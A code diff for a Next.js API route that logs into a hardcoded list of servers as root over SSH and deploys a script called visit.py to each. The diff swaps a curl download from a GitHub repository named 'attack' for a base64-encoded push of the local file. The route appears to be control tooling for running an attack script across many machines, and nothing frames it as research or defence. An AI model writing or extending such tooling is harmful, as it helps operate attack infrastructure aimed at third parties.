@@ -1,5 +1,7 @@
 import { NextResponse } from 'next/server';
 import { Client } from 'ssh2';
+import { readFileSync } from 'fs';
+import { join } from 'path';
 
 const DEFAULT_SERVERS = [
   { host: '138.68.141.40', username: 'root' },
@@ -167,9 +169,19 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'deploy') {
+      // Read visit.py from project and encode as base64
+      let scriptB64;
+      try {
+        const scriptPath = join(process.cwd(), 'visit.py');
+        const scriptContent = readFileSync(scriptPath, 'utf-8');
+        scriptB64 = Buffer.from(scriptContent).toString('base64');
+      } catch(e) {
+        return NextResponse.json({ error: 'Could not read visit.py: ' + e.message }, { status: 500 });
+      }
+      
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const deployCmd = 'curl -sL "https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py" -o /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"';
+          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
           const r = await runSSHCommand(server, deployCmd, 15000);
           return { host: server.host, ...r };
         })
